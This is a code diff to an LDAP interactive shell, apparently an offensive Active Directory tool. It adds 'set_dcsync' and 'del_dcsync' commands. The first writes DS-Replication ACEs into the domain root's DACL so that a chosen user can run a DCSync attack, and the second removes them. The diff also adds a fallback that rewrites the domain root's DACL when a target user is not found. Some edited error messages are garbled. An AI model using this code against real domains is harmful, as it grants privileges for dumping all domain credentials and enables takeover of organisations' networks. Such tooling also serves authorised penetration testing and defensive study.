@@ -7,6 +7,7 @@ import random
 import re
 import shlex
 import string
+from struct import pack
 
 import ldap3
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
@@ -59,6 +60,18 @@ class LdapShell(cmd.Cmd):
         return ret_val
 
     @staticmethod
+    def string_to_bin(uuid):
+        # If a UUID in the 00000000-0000-0000-0000-000000000000 format, parse it as Variant 2 UUID
+        # The first three components of the UUID are little-endian, and the last two are big-endian
+        matches = re.match(
+            r"([\dA-Fa-f]{8})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})([\dA-Fa-f]{8})",
+            uuid)
+        (uuid1, uuid2, uuid3, uuid4, uuid5, uuid6) = [int(x, 16) for x in matches.groups()]
+        uuid = pack('<LHH', uuid1, uuid2, uuid3)
+        uuid += pack('>HHL', uuid4, uuid5, uuid6)
+        return uuid
+
+    @staticmethod
     def create_empty_sd():
         sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
         sd['Revision'] = b'\x01'
@@ -76,6 +89,33 @@ class LdapShell(cmd.Cmd):
         acl.aces = []
         sd['Dacl'] = acl
         return sd
+
+    @staticmethod
+    def createACE(sid, object_type=None, access_mask=983551): # 983551 Full control
+        nace = ldaptypes.ACE()
+        nace['AceFlags'] = 0x00
+
+        if object_type is None:
+            acedata = ldaptypes.ACCESS_ALLOWED_ACE()
+            nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+        else:
+            nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
+            acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
+            acedata['ObjectType'] = LdapShell.string_to_bin(object_type)
+            acedata['InheritedObjectType'] = b''
+            acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
+
+        acedata['Mask'] = ldaptypes.ACCESS_MASK()
+        acedata['Mask']['Mask'] = access_mask
+
+        if type(sid) is str:
+            acedata['Sid'] = ldaptypes.LDAP_SID()
+            acedata['Sid'].fromCanonical(sid)
+        else:
+            acedata['Sid'] = sid
+
+        nace['Ace'] = acedata
+        return nace
 
     @staticmethod
     def create_allow_ace(sid):
@@ -184,7 +224,7 @@ class LdapShell(cmd.Cmd):
         args = shlex.split(line)
 
         if not self.client.server.ssl:
-            log.error('Error adding a new computer with LDAP requires LDAPS.')
+            log.error('Error del a computer with LDAP requires LDAPS.')
 
         if len(args) != 1 and len(args) != 2:
             raise Exception('Expected a computer name and an optional password argument.')
@@ -225,6 +265,10 @@ class LdapShell(cmd.Cmd):
             parent_dn = f'CN=Users,{self.domain_dumper.root}'
         else:
             parent_dn = args[1]
+
+        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(new_user)})', attributes=['objectSid'])
+        if len(self.client.entries) != 0:
+            raise Exception(f'Failed add user: user {new_user} already exists!')
 
         new_password = ''.join(
             random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
@@ -456,7 +500,7 @@ class LdapShell(cmd.Cmd):
 
         if len(args) != 1 and len(args) != 2:
             raise Exception(
-                f'Expecting target and grantee names for RBCD attack. Received {len(args)} arguments instead.'
+                f'Expecting target and grantee names for DACL modified. Received {len(args)} arguments instead.'
             )
 
         controls = security_descriptor_control(sdflags=0x04)
@@ -466,7 +510,12 @@ class LdapShell(cmd.Cmd):
 
         success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
                                      attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
-        if not success or len(self.client.entries) != 1:
+        if len(self.client.entries) == 0:
+            #Try modify root
+            log.info('Not found user, try modify root')
+            success = self.client.search(self.domain_dumper.root, '(objectClass=*)', attributes=['objectSid', 'nTSecurityDescriptor'],
+                               controls=controls)
+        if not success:
             raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')
 
         target = self.client.entries[0]
@@ -495,6 +544,102 @@ class LdapShell(cmd.Cmd):
 
         if self.client.result['result'] == 0:
             log.info('DACL modified successfully! %s now has control of %s', grantee_name, target_name)
+        else:
+            self.process_error_response()
+
+    def do_set_dcsync(self, user_name):
+        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user_name)})',
+                           attributes=['objectSid' ])
+        if len(self.client.entries) != 1:
+            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')
+
+        user_sid = self.client.entries[0]['objectSid'].value
+        user_dn = self.client.entries[0].entry_dn
+
+        if not user_dn:
+            raise Exception(f'User not found in LDAP: {user_name}')
+
+        ldap_attribute = 'nTSecurityDescriptor'
+        target_dn = self.domain_dumper.root
+        self.client.search(target_dn, '(objectClass=*)', attributes=ldap_attribute, controls=None)
+
+        if len(self.client.entries) <= 0:
+            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')
+
+        entry_dn = self.client.entries[0].entry_dn
+        sd_data = self.client.entries[0][ldap_attribute].raw_values
+
+        if len(sd_data) < 1:
+            raise Exception(f'Check if user {user_name} have write access to the domain object')
+        else:
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])
+
+        old_sd = sd
+        attr_values = []
+
+        sd['Dacl'].aces.append(self.createACE(sid=user_sid, object_type='1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')) #set DS-Replication-Get-Changes-All
+        sd['Dacl'].aces.append(self.createACE(sid=user_sid, object_type='1131f6aa-9c07-11d1-f79f-00c04fc2dcd2')) #set DS-Replication-Get-Changes
+        sd['Dacl'].aces.append(self.createACE(sid=user_sid, object_type='89e95b76-444d-4c62-991a-0facbeda640c')) #set DS-Replication-Get-Changes-In-Filtered-Set
+
+        if len(sd['Dacl'].aces) > 0 or ldap_attribute == 'nTSecurityDescriptor':
+            attr_values.append(sd.getData())
+        self.client.modify(entry_dn, {ldap_attribute: [ldap3.MODIFY_REPLACE, attr_values]})
+
+        if self.client.result['result'] == 0:
+            log.info('DACL modified successfully! %s now has DS-Replication privilege and can perform DCSync attack!', user_name)
+        else:
+            self.process_error_response()
+
+    def do_del_dcsync(self, user_name):
+        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user_name)})',
+                           attributes=['objectSid' ])
+        if len(self.client.entries) != 1:
+            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')
+
+        user_sid = self.client.entries[0]['objectSid'].value
+        user_dn = self.client.entries[0].entry_dn
+
+        if not user_dn:
+            raise Exception(f'User not found in LDAP: {user_name}')
+
+        ldap_attribute = 'nTSecurityDescriptor'
+        target_dn = self.domain_dumper.root
+        self.client.search(target_dn, '(objectClass=*)', attributes=ldap_attribute, controls=None)
+
+        if len(self.client.entries) <= 0:
+            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')
+
+        entry_dn = self.client.entries[0].entry_dn
+        sd_data = self.client.entries[0][ldap_attribute].raw_values
+
+        if len(sd_data) < 1:
+            raise Exception(f'Check if user {user_name} have write access to the domain object')
+        else:
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])
+
+        old_sd = sd
+        attr_values = []
+        new_aces = []
+        dc_sync_attr_bin = [LdapShell.string_to_bin(e) for e in ['1131f6ad-9c07-11d1-f79f-00c04fc2dcd2','1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','89e95b76-444d-4c62-991a-0facbeda640c']]
+
+        for e in sd['Dacl'].aces:
+            if e['Ace']['Sid'].formatCanonical() == user_sid:
+                try:
+                    if not e['Ace']['ObjectType'] in dc_sync_attr_bin:
+                        new_aces.append(e)
+                except:
+                    new_aces.append(e)
+            else:
+                new_aces.append(e)
+
+        sd['Dacl'].aces = new_aces
+
+        if len(sd['Dacl'].aces) > 0 or ldap_attribute == 'nTSecurityDescriptor':
+            attr_values.append(sd.getData())
+        self.client.modify(entry_dn, {ldap_attribute: [ldap3.MODIFY_REPLACE, attr_values]})
+
+        if self.client.result['result'] == 0:
+            log.info('DACL modified successfully! %s now has no DS-Replication privilege.', user_name)
         else:
             self.process_error_response()
 
@@ -587,6 +732,8 @@ disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
+set_dcsync user - If you have write access to the domain object, assign the DS-Replication right to the selected user.
+del_dcsync user - Delete DS-Replication right to the selected user.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
